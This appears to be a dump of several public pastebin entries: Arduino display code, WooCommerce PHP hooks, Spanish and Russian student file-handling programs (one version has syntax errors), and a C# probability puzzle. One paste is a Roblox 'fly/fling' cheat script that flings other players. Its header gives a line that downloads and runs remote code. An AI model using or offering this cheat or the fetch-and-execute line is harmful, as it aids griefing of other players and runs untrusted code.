    Serial.println(F(""If using the breakout board, it should NOT be #defined!""));
    Serial.println(F(""Also if using the breakout, double-check that all wiring""));
    Serial.println(F(""matches the tutorial.""));
    return;
  }

  tft.begin(identifier);

  Serial.println(F(""Done!""));
  tft.setRotation(1);
  testText();
}

void loop(void) {
    // send data only when you receive data:
  if (Serial.available() > 0) {
    // read the incoming byte:
    speed = Serial.readString();

    // say what you got:
    Serial.print(""I received: "");
    Serial.println(speed);
    testText();
  }   

}

unsigned long testFillScreen() {
  unsigned long start = micros();
  tft.fillScreen(BLACK);
  tft.fillScreen(RED);
  tft.fillScreen(GREEN);
  tft.fillScreen(BLUE);
  tft.fillScreen(BLACK);
  return micros() - start;
}

unsigned long testText() {
  tft.fillScreen(BLACK);
  //unsigned long start = micros();
  tft.setCursor(0, 0);


  tft.setTextColor(RED);
  tft.setTextSize(20);
  tft.println(speed);
  tft.setTextSize(10);
  tft.println(""mph"");


  //return micros() - start;
}

unsigned long testLines(uint16_t color) {
  unsigned long start, t;
  int           x1, y1, x2, y2,
                w = tft.width(),
                h = tft.height();

  tft.fillScreen(BLACK);

  x1 = y1 = 0;
  y2    = h - 1;
  start = micros();
  for(x2=0; x2<w; x2+=6) tft.drawLine(x1, y1, x2, y2, color);
  x2    = w - 1;
  for(y2=0; y2<h; y2+=6) tft.drawLine(x1, y1, x2, y2, color);
  t     = micros() - start; // fillScreen doesn't count against timing

  tft.fillScreen(BLACK);

  x1    = w - 1;
  y1    = 0;
  y2    = h - 1;
  start = micros();
  for(x2=0; x2<w; x2+=6) tft.drawLine(x1, y1, x2, y2, color);
  x2    = 0;
  for(y2=0; y2<h; y2+=6) tft.drawLine(x1, y1, x2, y2, color);
  t    += micros() - start;

  tft.fillScreen(BLACK);

  x1    = 0;
  y1    = h - 1;
  y2    = 0;
  start = micros();
  for(x2=0; x2<w; x2+=6) tft.drawLine(x1, y1, x2, y2, color);
  x2    = w - 1;
  for(y2=0; y2<h; y2+=6) tft.drawLine(x1, y1, x2, y2, color);
  t    += micros() - start;

  tft.fillScreen(BLACK);

  x1    = w - 1;
  y1    = h - 1;
  y2    = 0;
  start = micros();
  for(x2=0; x2<w; x2+=6) tft.drawLine(x1, y1, x2, y2, color);
  x2    = 0;
  for(y2=0; y2<h; y2+=6) tft.drawLine(x1, y1, x2, y2, color);

  return micros() - start;
}

unsigned long testFastLines(uint16_t color1, uint16_t color2) {
  unsigned long start;
  int           x, y, w = tft.width(), h = tft.height();

  tft.fillScreen(BLACK);
  start = micros();
  for(y=0; y<h; y+=5) tft.drawFastHLine(0, y, w, color1);
  for(x=0; x<w; x+=5) tft.drawFastVLine(x, 0, h, color2);

  return micros() - start;
}

unsigned long testRects(uint16_t color) {
  unsigned long start;
  int           n, i, i2,
                cx = tft.width()  / 2,
                cy = tft.height() / 2;

  tft.fillScreen(BLACK);
  n     = min(tft.width(), tft.height());
  start = micros();
  for(i=2; i<n; i+=6) {
    i2 = i / 2;
    tft.drawRect(cx-i2, cy-i2, i, i, color);
  }

  return micros() - start;
}

unsigned long testFilledRects(uint16_t color1, uint16_t color2) {
  unsigned long start, t = 0;
  int           n, i, i2,
                cx = tft.width()  / 2 - 1,
                cy = tft.height() / 2 - 1;

  tft.fillScreen(BLACK);
  n = min(tft.width(), tft.height());
  for(i=n; i>0; i-=6) {
    i2    = i / 2;
    start = micros();
    tft.fillRect(cx-i2, cy-i2, i, i, color1);
    t    += micros() - start;
    // Outlines are not included in timing results
    tft.drawRect(cx-i2, cy-i2, i, i, color2);
  }

  return t;
}

unsigned long testFilledCircles(uint8_t radius, uint16_t color) {
  unsigned long start;
  int x, y, w = tft.width(), h = tft.height(), r2 = radius * 2;

  tft.fillScreen(BLACK);
  start = micros();
  for(x=radius; x<w; x+=r2) {
    for(y=radius; y<h; y+=r2) {
      tft.fillCircle(x, y, radius, color);
    }
  }

  return micros() - start;
}

unsigned long testCircles(uint8_t radius, uint16_t color) {
  unsigned long start;
  int           x, y, r2 = radius * 2,
                w = tft.width()  + radius,
                h = tft.height() + radius;

  // Screen is not cleared for this one -- this is
  // intentional and does not affect the reported time.
  start = micros();
  for(x=0; x<w; x+=r2) {
    for(y=0; y<h; y+=r2) {
      tft.drawCircle(x, y, radius, color);
    }
  }

  return micros() - start;
}

unsigned long testTriangles() {
  unsigned long start;
  int           n, i, cx = tft.width()  / 2 - 1,
                      cy = tft.height() / 2 - 1;

  tft.fillScreen(BLACK);
  n     = min(cx, cy);
  start = micros();
  for(i=0; i<n; i+=5) {
    tft.drawTriangle(
      cx    , cy - i, // peak
      cx - i, cy + i, // bottom left
      cx + i, cy + i, // bottom right
      tft.color565(0, 0, i));
  }

  return micros() - start;
}

unsigned long testFilledTriangles() {
  unsigned long start, t = 0;
  int           i, cx = tft.width()  / 2 - 1,
                   cy = tft.height() / 2 - 1;

  tft.fillScreen(BLACK);
  start = micros();
  for(i=min(cx,cy); i>10; i-=5) {
    start = micros();
    tft.fillTriangle(cx, cy - i, cx - i, cy + i, cx + i, cy + i,
      tft.color565(0, i, i));
    t += micros() - start;
    tft.drawTriangle(cx, cy - i, cx - i, cy + i, cx + i, cy + i,
      tft.color565(i, i, 0));
  }

  return t;
}

unsigned long testRoundRects() {
  unsigned long start;
  int           w, i, i2,
                cx = tft.width()  / 2 - 1,
                cy = tft.height() / 2 - 1;

  tft.fillScreen(BLACK);
  w     = min(tft.width(), tft.height());
  start = micros();
  for(i=0; i<w; i+=6) {
    i2 = i / 2;
    tft.drawRoundRect(cx-i2, cy-i2, i, i, i/8, tft.color565(i, 0, 0));
  }

  return micros() - start;
}

unsigned long testFilledRoundRects() {
  unsigned long start;
  int           i, i2,
                cx = tft.width()  / 2 - 1,
                cy = tft.height() / 2 - 1;

  tft.fillScreen(BLACK);
  start = micros();
  for(i=min(tft.width(), tft.height()); i>20; i-=6) {
    i2 = i / 2;
    tft.fillRoundRect(cx-i2, cy-i2, i, i, i/8, tft.color565(0, i, 0));
  }

  return micros() - start;
}
"
hmtpiK6N,Untitled,dertarchingratadata,JSON,Monday 4th of December 2023 04:09:29 PM CDT,"{
    ""query_type"": ""search_suggestions"",
    ""query"": ""data"",
    ""suggestions"": {
        ""companies"": [""123ABC"", ""789XYZ""],
    },
}"
9F3L7iZZ,Untitled,emacuervo,C++,Monday 4th of December 2023 04:04:44 PM CDT,"#include <iostream>
#include <clocale>
#include <cstring>
using namespace std;

void cargarCadena(char *palabra, int tam){
    int i=0;
    fflush(stdin);
    for (i=0; i<tam; i++){
        palabra[i]=cin.get();
        if (palabra[i]=='\n'){
            break;
        }
    }
    palabra[i]='\0';
    fflush(stdin);
}

class Fecha{
private:
    int dia,mes, anio;
public:
    void Cargar(){
        cin>>dia;
        cin>>mes;
        cin>>anio;
    }
    void Mostrar(){
        cout<<dia<<""/"";
        cout<<mes<<""/"";
        cout<<anio<<endl;
    }
    int getDia(){return dia;}
    int getMes(){return mes;}
    int getAnio(){return anio;}

    void setDia(int d){dia=d;}
    void setMes(int m){mes=m;}
    void setAnio(int a){anio=a;}

};

class Partidos{
    private:
        int codPartido;
        int sede;
        int codLocal;
        int codVisitante;
        Fecha fechaRealizacion;
        char nombreArbitro[50];
        bool estado;

    public:
        Partidos(int codPart = 0){
            codPartido = codPart;
        }

        int getCodPartido(){return codPartido;}
        int getSede(){return sede;}
        int getCodLocal(){return codLocal;}
        int getCodVisitante(){return codVisitante;}
        Fecha getFechaRealizacion(){return fechaRealizacion;}
        const char* getNombreArbitro(){return nombreArbitro;}
        bool getEstado(){return estado;}

        void setCodPartido(int cp){codPartido = cp;}
        void setSede(int s){sede = s;}
        void setCodLocal(int cl){codLocal = cl;}
        void setCodVisitante(int cv){codVisitante = cv;}
        void setFechaRealizacion(Fecha f){fechaRealizacion = f;}
        void setNombreArbitro(const char* na){strcpy(nombreArbitro, na);}
        void setEstado(bool e){estado = e;}

        bool Cargar(){
            cout<< ""CODIGO PARTIDO: "";
            cin>> codPartido;
            cout<< ""SEDE: "";
            cin>> sede;
            cout<< ""CODIGO EQUIPO LOCAL: "";
            cin>> codLocal;
            cout<< ""CODIGO EQUIPO VISITANTE: "";
            cin>> codVisitante;
            cout<< ""FECHA DE REALIZACION: "";
            fechaRealizacion.Cargar();
            cout<< ""NOMBRE DEL ARBITRO: "";
            cin>> nombreArbitro;
            estado = true;

            return true;
        }

        void Mostrar(){
            cout<< codPartido << endl;
            cout<< sede << endl;
            cout<< codLocal << endl;
            cout<< codVisitante << endl;
            fechaRealizacion.Mostrar();
            cout<< nombreArbitro << endl;
            cout<< estado << endl;
        }
};


class ArchivoPartido{
    private:
        char nombre[30];
    public:
        ArchivoPartido(const char *n){
            strcpy(nombre, n);
        }
        bool grabarRegistro(Partidos reg){
            FILE * archivo = fopen(nombre, ""ab"");
            if (archivo == NULL){
                return false;
            }
            Partidos registro;
            bool exito = registro.Cargar();
            if (exito){
                fwrite(&registro, sizeof registro, 1, archivo);
                cout << ""REGISTRO ESCRITO CON EXITO""<<endl;
            }
            fclose(archivo);
            return true;
        }
        bool mostrarRegistros(){
            FILE * archivo = fopen(nombre, ""rb"");
            if (archivo == NULL)
            {
                cout << ""ERROR ABRIENDO EL ARCHIVO en MOSTRAR\n"";
                return false;
            }
            Partidos leer;
            while(fread(&leer, sizeof leer, 1, archivo)==1)
            {
                if (leer.getEstado()) leer.Mostrar();
            }
            fclose(archivo);
            return true;
        }

        int buscarCodigo (int codigo) {
            FILE * archivo = fopen(nombre, ""rb"");
            if (archivo == NULL) {
                cout << ""ERROR ABRIENDO EL ARCHIVO BUSCAR JUGADOR \n"";
                return -1;
            }
            Partidos leer;
            int pos = 0;
            while (fread(&leer, sizeof leer, 1, archivo)) {
                if (leer.getCodPartido() == codigo && leer.getEstado()) {
                    leer.Mostrar();
                    fclose(archivo);
                    return pos;
                }
                pos++;
            }
            cout << ""NO SE ENCONTRO EL EQUIPO CON EL CODIGO INGRESADO \n"";
            fclose(archivo);
            return -2;
        }
        bool bajaLogica() {
            int codigo;
            cout << ""INGRESAR CODIGO DEL EQUIPO: "";
            cin >> codigo;
            int pos = buscarCodigo(codigo);
            if (pos > -1) {
                FILE * archivo = fopen(nombre, ""r+b"");
                if (archivo == NULL) {
                    cout << ""ERROR ABRIENDO EL ARCHIVO \n"";
                    return false;
                }
                Partidos leer;
                fseek(archivo, sizeof leer * pos, SEEK_SET);
                fread(&leer, sizeof leer, 1, archivo);

                leer.setEstado(false);
                fseek(archivo, sizeof leer * pos, SEEK_SET);
                if (fwrite(&leer, sizeof leer, 1, archivo)) {
                    fclose(archivo);
                    cout << ""REGISTRO ELIMINADO CON EXITO \n"";
                    return true;
                }
                fclose(archivo);
                cout << ""ERROR DE ARCHIVO, INTENTA DE NUEVO\n"";
                return false;
            }
            return false;
        }

        Partidos leerRegistro(int pos){
            Partidos reg;
            reg.setCodLocal(-1);
            FILE *p;
            p=fopen(nombre, ""rb"");
            if(p==NULL) return reg;
            fseek(p, sizeof(Partidos)*pos,0);
            fread(&reg, sizeof reg,1, p);
            fclose(p);
            return reg;
        }
        int contarRegistros(){
            FILE *p;
            p=fopen(nombre, ""rb"");
            if(p==NULL) return -1;
            fseek(p, 0,2);
            int tam=ftell(p);
            fclose(p);
            return tam/sizeof(Partidos);
        }
};

void punto3(){
    ArchivoPartido archPart(""Partidos.dat"");
    int cantPart = archPart.contarRegistros();
    Partidos regPart;

    Fecha fechaNueva;
    cout<< ""INGRESAR FECHA: "";
    fechaNueva.Cargar();

    if (cantPart <= 0){
        cout<< ""No hay registros"" << endl;
        return;
    }

    int cont=0;

    for (int x=0; x<cantPart; x++){
        regPart = archPart.leerRegistro(x);
        if  (fechaNueva.getAnio() < regPart.getFechaRealizacion().getAnio() && regPart.getEstado()){
            cont++;
        }
    }

    Partidos *v;

    v=new Partidos[cont];
    if(v==NULL) return;

    int pos=0;

    for (int x=0; x<cantPart; x++){
        regPart = archPart.leerRegistro(x);
        if (regPart.getEstado()){
            v[pos] = regPart;
            pos++;
        }
    }

    for (int x=0; x<cont; x++){
        v[x].Mostrar();
    }

    delete[] v;
}



int main (void){
	int opc;

    ArchivoPartido archPartidos(""Partidos.dat"");

    while(true){
        system(""cls"");
        cout<<""MENU ALUMNOS ""<<endl;
        cout<<""********************** ""<<endl;
        cout<<""1. AGREGAR REGISTRO ""<<endl;
        cout<<""2. BAJA LOGICA ""<< endl;
        cout<<""3. MOSTRAR REGISTROS ""<<endl;
        cout<<""0. SALIR DEL PROGRAMA ""<<endl;
        cout<<""********************** ""<<endl;
        cout<<""OPCION ""<<endl;
        cin>>opc;
        system(""cls"");
        switch(opc){
            case 1:
                archPartidos.grabarRegistro(opc);
                break;

            case 2:
                archPartidos.bajaLogica();
                break;
            case 3:
                punto3();
                break;
            case 0:
                return 0;
                break;

        }
        system(""pause"");
        system(""cls"");
    }


  return 0;
}"
gxRRhkpZ,WooCommerce:  Añadir descripción corta del producto al resumen del pedido en correos electrónicos,YordanSoares,PHP,Monday 4th of December 2023 04:04:28 PM CDT,"<?php
/**
 * WooCommerce:
 * Añadir descripción corta del producto al resumen del pedido en correos electrónicos de WooCommerce
 */
add_action( 'woocommerce_order_item_meta_start', 'anadir_descripcion_corta_en_emails', 10, 4 );
function anadir_descripcion_corta_en_emails( $item_id, $item, $order, $plain_text ) {

    // Comprobamos si estamos en un correo electrónico de WooCommerce y obtenemos el objeto del producto
    if ( did_action('woocommerce_email_header') && ( $product = wc_get_product( $item->get_product_id() ) ) ) {

        // Obtenemos la descripción corta del producto
        $descripcion_corta = $product->get_short_description();

        // Añadimos la descripción corta después de producto
        printf( '<p>%s</p>', $descripcion_corta );
    }
}"
RJEjcJJw,WooCommerce:  Copiar teléfono de la dirección de facturación en el de la dirección de envío,YordanSoares,PHP,Monday 4th of December 2023 04:03:34 PM CDT,"<?php
/**
 * WooCommerce:
 * Copiar el teléfono de la dirección de facturación
 * si el de la dirección de envío está vacío 
 */
add_action( 'woocommerce_checkout_order_created', function( $order ) {
    // Si el teléfono en la dirección de envío está vacío...
    if ( $billing_phone = $order->get_billing_phone() ) {
        // ...copiar el de la dirección de facturación
        $order->set_shipping_phone( $billing_phone );
        $order->save();
    }
}, 10, 2 );"
QANcF3AH,working q20,aadi_pastebin,C#,Monday 4th of December 2023 03:59:39 PM CDT,"/*
IN C#
fraudseter guessing 6 digit password
in some order the password features the digits 123 twice each
""additionally, he knows that no consecutive pair of digits are the same""
what to 3sf is his chance of a successful random guess
*/



using System;
using System.Collections.Generic;
using System.Linq;

internal class Program
{
    private static void Main(string[] args)
    {
        // Create a list to store generated numbers
        List<int> master_list = new List<int>();
        Console.WriteLine(""Working"");

        // Generate 620 unique 6-digit numbers and add them to the master list
        for (int i = 0; i < 620; i++)
        {
            // Generate a new 6-digit number
            int new_number = CreateNewNumber();

            // Ensure the new number is not a duplicate
            if (!master_list.Contains(new_number))
            {
                master_list.Add(new_number);
            }
        }

        // Display information about the master list
        Console.WriteLine($""Created the master list\n{master_list.Count} items in it"");
        Console.WriteLine($""{string.Join("", "", master_list)}"");

        // Filter the master list based on conditions and create a final list
        List<int> final_list = MakeFinalList(master_list);

        // Display information about the final list
        Console.WriteLine($""Created the final list\n{final_list.Count} items in it"");
        Console.WriteLine($""{string.Join("", "", final_list)}"");
    }

    // Function to generate a random 6-digit number with digits 1, 2, and 3 appearing twice each
    static int CreateNewNumber()
    {
        // String to store the generated number
        string big_number = """";

        // List of available digits (1, 1, 2, 2, 3, 3)
        List<int> digits_possible = new List<int> {1, 1, 2, 2, 3, 3};

        // Loop until all digits are used
        while (digits_possible.Count() != 0)
        {
            // Create a random number generator
            Random random = new Random();

            // Randomly select a digit
            int random_index = random.Next(0, digits_possible.Count);
            int random_digit = digits_possible[random_index];

            // Remove the selected digit from the list
            digits_possible.RemoveAt(random_index);

            // Append the digit to the number
            big_number += random_digit;
        }

        // Convert the string to an integer and return the generated number
        return int.Parse(big_number);
    }

    // Function to filter a list based on conditions
    static List<int> MakeFinalList(List<int> old_list)
    {
        // List to store the final filtered numbers
        List<int> new_list = new List<int>();

        // Iterate over each number in the old list
        foreach (int number in old_list)
        {
            // Convert the number to a string for digit-level analysis
            string number_as_string = number.ToString();

            // Ensure that the digits 1, 2, and 3 appear exactly twice each
            if (number_as_string.Count(c => c == '1') == 2 &&
                number_as_string.Count(c => c == '2') == 2 &&
                number_as_string.Count(c => c == '3') == 2)
            {
                // Check for no consecutive pair of digits being the same
                bool add_to_new_list = true;
                for (int i = 0; i < 5; i++)
                {
                    if (number_as_string[i] == number_as_string[i + 1])
                    {
                        // If consecutive digits are the same, set flag to false and break the loop
                        add_to_new_list = false;
                        break;
                    }
                }

                // If all conditions are met, add the number to the new list
                if (add_to_new_list)
                {
                    new_list.Add(number);
                }
            }
        }

        // Return the final filtered list
        return new_list;
    }
}
"
NsgMkEFC,Untitled,emacuervo,C++,Monday 4th of December 2023 03:59:37 PM CDT,"#include <iostream>
#include <clocale>
#include <cstring>
using namespace std;

void cargarCadena(char *palabra, int tam){
    int i=0;
    fflush(stdin);
    for (i=0; i<tam; i++){
        palabra[i]=cin.get();
        if (palabra[i]=='\n'){
            break;
        }
    }
    palabra[i]='\0';
    fflush(stdin);
}

class Fecha{
private:
    int dia,mes, anio;
public:
    void Cargar(){
        cin>>dia;
        cin>>mes;
        cin>>anio;
    }
    void Mostrar(){
        cout<<dia<<""/"";
        cout<<mes<<""/"";
        cout<<anio<<endl;
    }
    int getDia(){return dia;}
    int getMes(){return mes;}
    int getAnio(){return anio;}

    void setDia(int d){dia=d;}
    void setMes(int m){mes=m;}
    void setAnio(int a){anio=a;}

};

class Partidos{
    private:
        int codPartido;
        int sede;
        int codLocal;
        int codVisitante;
        Fecha fechaRealizacion;
        char nombreArbitro[50];
        bool estado;

    public:
        Partidos(int codPart = 0){
            codPartido = codPart;
        }

        int getCodPartido(){return codPartido;}
        int getSede(){return sede;}
        int getCodLocal(){return codLocal;}
        int getCodVisitante(){return codVisitante;}
        Fecha getFechaRealizacion(){return fechaRealizacion;}
        const char* getNombreArbitro(){return nombreArbitro;}
        bool getEstado(){return estado;}

        void setCodPartido(int cp){codPartido = cp;}
        void setSede(int s){sede = s;}
        void setCodLocal(int cl){codLocal = cl;}
        void setCodVisitante(int cv){codVisitante = cv;}
        void setFechaRealizacion(Fecha f){fechaRealizacion = f;}
        void setNombreArbitro(const char* na){strcpy(nombreArbitro, na);}
        void setEstado(bool e){estado = e;}

        bool Cargar(){
            cout<< ""CODIGO PARTIDO: "";
            cin>> codPartido;
            cout<< ""SEDE: "";
            cin>> sede;
            cout<< ""CODIGO EQUIPO LOCAL: "";
            cin>> codLocal;
            cout<< ""CODIGO EQUIPO VISITANTE: "";
            cin>> codVisitante;
            cout<< ""FECHA DE REALIZACION: "";
            fechaRealizacion.Cargar();
            cout<< ""NOMBRE DEL ARBITRO: "";
            cin>> nombreArbitro;
            estado = true;

            return true;
        }

        void Mostrar(){
            cout<< codPartido << endl;
            cout<< sede << endl;
            cout<< codLocal << endl;
            cout<< codVisitante << endl;
            fechaRealizacion.Mostrar();
            cout<< nombreArbitro << endl;
            cout<< estado << endl;
        }
};


class ArchivoPartido{
    private:
        char nombre[30];
    public:
        ArchivoPartido(const char *n){
            strcpy(nombre, n);
        }
        bool grabarRegistro(Partidos reg){
            FILE * archivo = fopen(nombre, ""ab"");
            if (archivo == NULL){
                return false;
            }
            Partidos registro;
            bool exito = registro.Cargar();
            if (exito){
                fwrite(&registro, sizeof registro, 1, archivo);
                cout << ""REGISTRO ESCRITO CON EXITO""<<endl;
            }
            fclose(archivo);
            return true;
        }
        bool mostrarRegistros(){
            FILE * archivo = fopen(nombre, ""rb"");
            if (archivo == NULL)
            {
                cout << ""ERROR ABRIENDO EL ARCHIVO en MOSTRAR\n"";
                return false;
            }
            Partidos leer;
            while(fread(&leer, sizeof leer, 1, archivo)==1)
            {
                if (leer.getEstado()) leer.Mostrar();
            }
            fclose(archivo);
            return true;
        }

        int buscarCodigo (int codigo) {
            FILE * archivo = fopen(nombre, ""rb"");
            if (archivo == NULL) {
                cout << ""ERROR ABRIENDO EL ARCHIVO BUSCAR JUGADOR \n"";
                return -1;
            }
            Partidos leer;
            int pos = 0;
            while (fread(&leer, sizeof leer, 1, archivo)) {
                if (leer.getCodPartido() == codigo && leer.getEstado()) {
                    leer.Mostrar();
                    fclose(archivo);
                    return pos;
                }
                pos++;
            }
            cout << ""NO SE ENCONTRO EL EQUIPO CON EL CODIGO INGRESADO \n"";
            fclose(archivo);
            return -2;
        }
        bool bajaLogica() {
            int codigo;
            cout << ""INGRESAR CODIGO DEL EQUIPO: "";
            cin >> codigo;
            int pos = buscarCodigo(codigo);
            if (pos > -1) {
                FILE * archivo = fopen(nombre, ""r+b"");
                if (archivo == NULL) {
                    cout << ""ERROR ABRIENDO EL ARCHIVO \n"";
                    return false;
                }
                Partidos leer;
                fseek(archivo, sizeof leer * pos, SEEK_SET);
                fread(&leer, sizeof leer, 1, archivo);

                leer.setEstado(false);
                fseek(archivo, sizeof leer * pos, SEEK_SET);
                if (fwrite(&leer, sizeof leer, 1, archivo)) {
                    fclose(archivo);
                    cout << ""REGISTRO ELIMINADO CON EXITO \n"";
                    return true;
                }
                fclose(archivo);
                cout << ""ERROR DE ARCHIVO, INTENTA DE NUEVO\n"";
                return false;
            }
            return false;
        }

        Partidos leerRegistro(int pos){
            Partidos reg;
            reg.setCodLocal(-1);
            FILE *p;
            p=fopen(nombre, ""rb"");
            if(p==NULL) return reg;
            fseek(p, sizeof(Partidos)*pos,0);
            fread(&reg, sizeof reg,1, p);
            fclose(p);
            return reg;
        }
        int contarRegistros(){
            FILE *p;
            p=fopen(nombre, ""rb"");
            if(p==NULL) return -1;
            fseek(p, 0,2);
            int tam=ftell(p);
            fclose(p);
            return tam/sizeof(Partidos);
        }
};

void punto3(){
    ArchivoPartido archPart(""Partidos.dat"");
    int cantPart = archPart.contarRegistros();
    Partidos regPart;
    
    Fecha fechaNueva;
    cout<< ""INGRESAR FECHA: "";
    fechaNueva.Cargar();

    if (cantPart <= 0){
        cout<< ""No hay registros"" << endl;
        return;
    }
    
    int cont=0;

    for (int x=0; x<cantPart; x++){
        regPart = archPart.leerRegistro(x);
        if  (fechaNueva < regPart.getFechaRealizacion().getAnio() && regPart.getEstado()){
            cont++
        }
    }
    
    Partidos *v;
    
    v=new Partidos[cont];
    if(v==NULL) return;
    
    int pos=0;
    
    for (int x=0; x<cantPart; x++){
        regPart = archPart.leerRegistro(x);
        if (regPart.getEstado()){
            v[pos] = regPart;
            pos++;
        }
    }

    for (int x=0; x<cont; x++){
        v[x].Mostrar();
    }

    delete[] v;
}



int main (void){
	int opc;

    ArchivoPartido archPartidos(""Partidos.dat"");

    while(true){
        system(""cls"");
        cout<<""MENU ALUMNOS ""<<endl;
        cout<<""********************** ""<<endl;
        cout<<""1. AGREGAR REGISTRO ""<<endl;
        cout<<""2. BAJA LOGICA ""<< endl;
        cout<<""3. MOSTRAR REGISTROS ""<<endl;
        cout<<""0. SALIR DEL PROGRAMA ""<<endl;
        cout<<""********************** ""<<endl;
        cout<<""OPCION ""<<endl;
        cin>>opc;
        system(""cls"");
        switch(opc){
            case 1:
                archPartidos.grabarRegistro(opc);
                break;

            case 2:
                archPartidos.bajaLogica();
                break;
            case 3:
                punto3();
                break;
            case 0:
                return 0;
                break;

        }
        system(""pause"");
        system(""cls"");
    }


  return 0;
}
"
0dunVe3x,Steep Steps fly/fling script,EXO_DEV,Lua,Monday 4th of December 2023 03:57:50 PM CDT,"--[[
 
 
        made by _Exec4tble_#2226
        execute loadstring below to stay updated:
loadstring(game:HttpGet('https://pastebin.com/raw/0dunVe3x'))()
 
 
        -------------------------
        hold Q/E to move DOWN/UP
        press X to toggle the script
        press F to toggle fling mode
        -------------------------
 
 
 
 
 
 
 
 
 
 
 
]]--
local pl = game.Players.LocalPlayer
local uis = game:GetService(""UserInputService"")
local placed = game.Workspace:FindFirstChild(""playerPlaced"")
local lad = nil
local ch = pl.Character
local hrp = ch.HumanoidRootPart
if _G.began and typeof(_G.began) == ""RBXScriptConnection"" then _G.began:Disconnect() end; task.wait()
if _G.ended and typeof(_G.ended) == ""RBXScriptConnection"" then _G.ended:Disconnect() end; task.wait()
state = true
flingState = false
moveVal = 0
loopVal = 0
_G.began = nil
_G.ended = nil
if placed:FindFirstChild(pl.Name .. ""_ladder"") then
	lad = placed:FindFirstChild(pl.Name .. ""_ladder"")
end

_G.began = uis.InputBegan:Connect(function(key, typ)
	if typ then return end

	if key.KeyCode == Enum.KeyCode.X then
        state = not state
        if placed:FindFirstChild(pl.Name .. ""_ladder"") then
            lad = placed:FindFirstChild(pl.Name .. ""_ladder"")
        end
        print(state and ""turned on"" or ""turned off"")
    elseif key.KeyCode == Enum.KeyCode.E then
        moveVal = 1
    elseif key.KeyCode == Enum.KeyCode.Q then
        moveVal = -1
    elseif key.KeyCode == Enum.KeyCode.F then
        flingState = not flingState
	end
end)
_G.ened = uis.InputEnded:Connect(function(key, typ)
	if typ then return end

    if key.KeyCode == Enum.KeyCode.E then
        moveVal = 0
    elseif key.KeyCode == Enum.KeyCode.Q then
        moveVal = 0
	end
end)

function rng(n)
    return math.random(-n*n,n*n)
end
local incr = true
while task.wait() do
    if state then 
        if incr then
            loopVal += 0.15
            if loopVal >= 1 then
                incr = false
            end
        else
            loopVal -= 0.15
            if loopVal <= -3 then
                incr = true
            end
        end
        local suc, res = pcall(function()
            ch = pl.Character
            hrp = ch.HumanoidRootPart
            local defPos = hrp.CFrame * CFrame.new(0,-3.5+moveVal,0) * CFrame.Angles(math.rad(90),0,0)
            local flingPos = hrp.CFrame * CFrame.new(0,moveVal+loopVal,-6) * CFrame.Angles(math.rad(90),0,0)
            
            lad:SetPrimaryPartCFrame(flingState and flingPos or defPos)
            for _,part in next, lad:GetChildren() do
                if part:IsA(""BasePart"") then
                    part.AssemblyLinearVelocity = flingState and Vector3.new(rng(50),300,rng(50)) or Vector3.zero
                    part.AssemblyAngularVelocity = flingState and Vector3.zero or Vector3.zero
                    if flingState then
                        part.CanCollide = false
                    else
                        part.CanCollide = (not part.Name == ""Center"" and false or true) 
                    end
                end
            end
        end)
        if not suc and (not res:lower():find(""setprim"")) then warn(res) end
    else 
        for _,part in next, lad:GetChildren() do
            if part:IsA(""BasePart"") then
                part.CanCollide = true
            end
        end
    end
end"
VGZtBWh0,Untitled,dertarchingratadata,JSON,Monday 4th of December 2023 03:51:32 PM CDT,"{
    ""popup"": ""Company Explorer"",
    ""action"": ""Open"",
    ""source"": ""CTA: Add Companies"" // or individual widgets, filter panel
}"
mf7ixzLy,KT_5(структуры + файлы),ksyshshot,C,Monday 4th of December 2023 03:47:30 PM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <string.h>
#include <locale.h>

const char fileName[] = ""D:\\i.txt"";
const char newFileName[] = ""D:\\temp.txt"";

struct person {
	char lastName[50];
	char departName[50];
	int salary;
};

void inputNewPerson()
{
	struct person curr;
	printf(""Введите данные для добавления нового работника (название отдела, фамилия сотрудника, заработная плата).\n"");
	scanf(""%s %s %d"", &curr.departName, &curr.lastName, &curr.salary);
	FILE* base = fopen(fileName, ""a"");
	fprintf(base, ""%s %s %d "", curr.departName, curr.lastName, curr.salary);
	fclose(base);
}

void editPerson(char lastName[], int forDelete)
{
	struct person curr, edit;
	FILE* base = fopen(fileName, ""r+"");
	FILE* new = fopen(newFileName, ""w"");
	int begin, end = -1;
	do
	{
		begin = ftell(base);
		fscanf(base, ""%s %s %d "", &curr.departName, &curr.lastName, &curr.salary);
		if (strcmp(curr.lastName, lastName) == 0)
		{
			end = ftell(base);
		}
	} while ((feof(base) == 0) && (strcmp(curr.lastName, lastName) != 0));
	rewind(base);
	if (end > -1)
	{
		while (ftell(base) != begin)
		{
			fscanf(base, ""%s %s %d "", &curr.departName, &curr.lastName, &curr.salary);
			fprintf(new, ""%s %s %d "", curr.departName, curr.lastName, curr.salary);
		}
		if (forDelete == 1)
		{
			fseek(base, end, SEEK_SET);
			printf(""Сотрудник удалён из базы!\n"");
		}
		else
		{
			fscanf(base, ""%s %s %d "", &edit.departName, &edit.lastName, &edit.salary);
			int choice = 0;
			do
			{
				printf(""Что вы хотите изменить в записи о сотруднике? (1 - отдел, 2 - фамилия, 3 - зарплата): "");
				scanf(""%d"", &choice);
				switch (choice)
				{
				case 1:
					printf(""Введите название отдела: "");
					scanf(""%s"", &edit.departName);
					break;
				case 2:
					printf(""Введите фамилию работника: "");
					scanf(""%s"", &edit.lastName);
					break;
				case 3:
					printf(""Введите зарплату сотрудника: "");
					scanf(""%d"", &edit.salary);
					break;
				default:
					break;
				}
				printf(""Хотите изменить ещё что-нибудь о сотруднике? (1 - да, 0 - нет): "");
				scanf(""%d"", &choice);
				printf(""Изменения сохранены!\n"");
			} while (choice == 1);
			fprintf(new, ""%s %s %d "", edit.departName, edit.lastName, edit.salary);
		}
		while (feof(base) == 0)
		{
			fscanf(base, ""%s %s %d "", &curr.departName, &curr.lastName, &curr.salary);
			fprintf(new, ""%s %s %d "", curr.departName, curr.lastName, curr.salary);
		}
	}
	else
	{
		printf(""Сотрудника с такой фамилией не найдено!\n"");
	}
	fclose(base);
	fclose(new);
	if (end > -1)
	{
		remove(fileName);
		rename(newFileName, fileName);
	}
}

void task()
{
	struct person curr;
	FILE* base = fopen(fileName, ""r"");
	int workerCount = 0, allSalary = 0;
	float averageSalary = 0;
	char department[50];

	//fprintf(base, ""А Иванов 540 "");
	//fscanf(base, ""%s %s %d "", &curr.departName, &curr.lastName, &curr.salary);
	//printf(""%s %s %d"", curr.departName, curr.lastName, curr.salary);

	printf(""Введите название отдела: "");
	scanf(""%s"", &department);

	do
